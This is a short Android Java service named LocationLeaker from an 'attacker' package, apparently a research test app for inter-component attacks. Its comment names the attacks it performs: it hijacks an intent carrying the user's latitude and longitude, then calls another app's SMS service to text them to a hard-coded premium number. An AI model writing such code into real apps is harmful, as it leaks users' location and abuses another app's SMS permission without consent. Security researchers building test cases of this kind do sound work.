package edu.uci.seal.attacker;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class LocationLeaker extends Service {

    String premiumNumber="5554443333";
    public LocationLeaker() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    /**
     * This service performs the following security vulnerabilities:
     * service hijacking ICC attack to get the location
     * privilege escalation attack, it interacts with a component that has SMS permission
     * information leakage in which it leaks the location information to a premium number through an SMS
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //get the location from the intent
        double longitude = intent.getDoubleExtra("LONG", 0);
        double latitude = intent.getDoubleExtra("LAT", 0);
        Log.i("Attacker", "received the location "+longitude+" "+latitude+" Thank you!");

        //send the location via a text message
        Intent i = new Intent();
        i.setAction("edu.uci.seal.action.SEND_SMS");
        i.putExtra("PHONE_NUMBER", premiumNumber);
        i.putExtra("TEXT_MSG", "longitude:"+longitude+", latitude:"+latitude);
        startService(i);

        return START_NOT_STICKY;
    }
    }
